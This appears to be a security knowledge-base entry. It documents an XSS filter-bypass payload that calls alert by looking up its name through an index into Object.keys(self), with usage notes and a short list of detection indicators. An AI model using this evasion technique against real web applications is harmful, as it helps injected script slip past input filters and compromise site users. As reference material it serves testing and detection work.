---
id: 8dd02246-2ce5-4eba-8369-30ea374db3a4
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:42.768317+00:00'
updated_at: '2023-04-10T20:21:46.075934+00:00'
tags:
  - xss
  - index-access
  - bypass
platforms:
  - Web
  - Browser
validated: true
---

# Execute-Alert-Using-Global-Index

## Code

```javascript
Object.keys(self)[5]
// "alert"
self[Object.keys(self)[5]]("1") // alert("1")
```

## Description

Retrieves the alert function name by index from global keys and executes it with an argument, bypassing string-based filters.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 5 | Index of alert in Object.keys(self); adjust based on environment | 5 |
| "1" | Argument to alert | "1" |

## Usage

Use after finding the index; first line verifies, second executes. Ideal for dynamic payloads.

## Detection

- Object.keys calls on global objects.
- Indexed property access patterns in JS execution traces.

## Related

- [[procedures/Bypass-XSS-Alert-Filter-Using-Alternate-Functions]]
